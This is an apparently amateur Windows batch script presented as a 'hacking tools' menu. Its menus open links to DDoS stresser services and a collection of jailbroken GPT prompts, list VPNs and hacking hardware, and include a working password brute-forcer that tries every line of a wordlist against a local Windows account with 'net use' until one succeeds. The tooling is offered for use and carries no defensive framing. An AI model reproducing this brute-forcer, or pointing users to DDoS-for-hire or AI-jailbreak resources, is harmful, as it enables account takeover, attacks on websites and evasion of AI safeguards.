@echo off
:c
mode 75, 30
chcp 65001 >nul
call powershell exit >nul
color c
title    hacking tools -by sk7tt1zz 
type "mybanner.txt" 
echo.
echo.
echo     by sk7tt1zz
echo     Choose a menu To Open
echo     __________________
echo     1.websites attacks
echo     2.programs
echo     3.free vpns
echo     4.hacking tools
echo     5.user bruteforce
echo.
echo.

set /p ans="Enter Number:"

if %ans%==1 (
goto a
)

if %ans%==2 (
goto b
)

if %ans%==3 (
goto d
)

if %ans%==4 (
goto e
)

if %ans%==5 (
goto g
)


:a
cls
echo websites:
echo 1.jailbroken gpts
echo ddos:
echo 2.https://freestresser.so/
echo 3.https://hardstresser.com/
echo 4.https://stresser.net/
echo 5.https://str3ssed.co/
echo 6.https://projectdeltastress.com/
echo 7.back
set /p webinput=
if /I "%webinput%" EQU "1" start https://github.com/friuns2/BlackFriday-GPTs-Prompts/tree/main
if /I "%webinput%" EQU "2" start https://freestresser.so/
if /I "%webinput%" EQU "3" start https://hardstresser.com/
if /I "%webinput%" EQU "4" start https://stresser.net/
if /I "%webinput%" EQU "5" start https://str3ssed.co/
if /I "%webinput%" EQU "6" start https://projectdeltastress.com/
if /I "%webinput%" EQU "7" cls goto c
cls
goto c


:b
cls
echo programs:
echo 1.virtual box
echo 2.angryip
echo 3.back
set /p programsimput=
if /I "%programsimput%" EQU "1" start https://www.virtualbox.org/
if /I "%programsimput%" EQU "2" start https://angryip.org/
if /I "%programsimput%" EQU "3" cls goto c
cls 
goto c

:d
cls
echo free vpns:
echo 1.proton vpn
echo 2.urban vpn
echo 3.planet vpn
echo 4.gratis vpn (only for chrome)
echo 5.atlas vpn
echo 6.touch vpn
echo 7.itop vpn
echo 8.back
set /p vpninput=
if /I "%vpninput%" EQU "1" start https://account.protonvpn.com/signup?plan=free&currency=EUR&ref=upsell
if /I "%vpninput%" EQU "2" start https://www.urban-vpn.com/
if /I "%vpninput%" EQU "3" start https://freevpnplanet.com/
if /I "%vpninput%" EQU "4" start https://chromewebstore.google.com/detail/gratis-vpn-voor-chrome-fr/jcbiifklmgnkppebelchllpdbnibihel?hl=nl
if /I "%vpninput%" EQU "5" start https://atlasvpn.com/free-vpn
if /I "%vpninput%" EQU "6" start https://www.touchvpn.net/
if /I "%vpninput%" EQU "7" start https://www.itopvpn.com/free-vpn
if /I "%vpninput%" EQU "8" cls goto c
cls
goto c

:e
cls
echo   device        where to get
echo ______________ ________________
echo 1.flipper zero-flipper zero
echo 2.hackrf (best is portable)-almost anywhere that sells devices
echo 3.wifi nugget-retia.io
echo 4.m5stickcplus 2 or m5 for short-m5stack
echo 5.raspberry pi (running kali linux)-raspberry pi official
echo 6.bad usb-bad usb
echo 7.tv-b-gone-amazon
echo 8.deauthar watch-ali express
echo 9.back
set /p hackingdeviceinput=
if /I "%hackingdeviceinput%" EQU "9" cls goto c
cls
goto c

:g
cls
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mUser doesn't exist[0m
  pause >nul
  goto c
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found[0m
pause >nul
goto c

:success
echo.
echo [92m[+][0m [97mPassword found: %pass%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto c

:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto success
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success 
